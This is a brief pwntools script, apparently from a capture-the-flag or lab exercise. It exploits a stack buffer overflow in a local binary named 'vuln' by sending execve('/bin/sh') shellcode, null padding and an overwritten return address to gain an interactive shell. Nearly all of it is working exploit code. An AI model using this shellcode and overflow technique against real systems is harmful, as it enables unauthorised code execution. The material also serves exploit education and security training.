from pwn import *

# Start the vulnerable process
r = process("./vuln")

# Shellcode to invoke /bin/sh on a 64-bit Linux system
shellcode = b"\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"

# Craft the payload:
# 1. Add the shellcode.
# 2. Pad with null bytes to fill the buffer (assuming 88-byte buffer overflow).
# 3. Add the return address (0x601060 in this case).
payload = shellcode + (88 - len(shellcode)) * b"\x00" + p64(0x601060)

# Send the payload to the vulnerable process
r.sendline(payload)

# Interactive mode to maintain access
r.interactive()
